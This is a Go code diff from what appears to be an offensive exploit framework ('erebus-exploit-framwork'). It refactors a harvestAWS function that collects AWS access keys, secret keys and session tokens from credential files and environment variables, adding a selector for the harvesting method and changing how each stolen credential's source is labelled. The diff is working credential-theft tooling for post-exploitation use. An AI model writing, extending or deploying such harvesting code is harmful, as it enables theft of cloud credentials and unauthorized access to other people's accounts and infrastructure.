@@ -2,7 +2,6 @@ package cloud
 
 import (
 	"bufio"
-	"context"
 	"os"
 	"path/filepath"
 	"strings"
@@ -10,22 +9,38 @@ import (
 	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
 )
 
-// harvestAWS reads AWS credential files, environment variables, and IMDS instance
-// profile credentials. Cross-platform.
-func harvestAWS(ctx context.Context) []*pb.CloudHarvestResult {
+// harvestAWS reads AWS credential files and environment variables.
+// IMDS instance profile credentials are handled by harvestIMDS. Cross-platform.
+func harvestAWS(method string) []*pb.CloudHarvestResult {
 	var results []*pb.CloudHarvestResult
 
-	// 1. Environment variables
-	if r := harvestAWSEnvVars(); r != nil {
-		results = append(results, r)
+	switch method {
+	case "creds", "cli":
+		if r := harvestAWSCredFiles(); r != nil {
+			results = append(results, r)
+		}
+	case "env_vars":
+		if r := harvestAWSEnvVars(); r != nil {
+			results = append(results, r)
+		}
+	case "imds":
+		// IMDS requires context; handled by cloud.go via harvestIMDS
+	case "all":
+		if r := harvestAWSEnvVars(); r != nil {
+			results = append(results, r)
+		}
+		if r := harvestAWSCredFiles(); r != nil {
+			results = append(results, r)
+		}
+	default:
+		if r := harvestAWSEnvVars(); r != nil {
+			results = append(results, r)
+		}
+		if r := harvestAWSCredFiles(); r != nil {
+			results = append(results, r)
+		}
 	}
 
-	// 2. Credential files
-	if r := harvestAWSCredFiles(); r != nil {
-		results = append(results, r)
-	}
-
-	// 3. IMDS instance profile (handled by harvestIMDS)
 	return results
 }
 
@@ -111,7 +126,7 @@ func parseAWSCredentialFile(path string) []*pb.CloudCredential {
 					Identity: accessKey,
 					Secret:   secretKey,
 					Extra:    sessionToken,
-					Source:   path + " [" + currentProfile + "]",
+					Source:   filepath.Base(path) + " [" + currentProfile + "]",
 				})
 			}
 
@@ -151,7 +166,7 @@ func parseAWSCredentialFile(path string) []*pb.CloudCredential {
 			Identity: accessKey,
 			Secret:   secretKey,
 			Extra:    sessionToken,
-			Source:   path + " [" + currentProfile + "]",
+			Source:   filepath.Base(path) + " [" + currentProfile + "]",
 		})
 	}
 
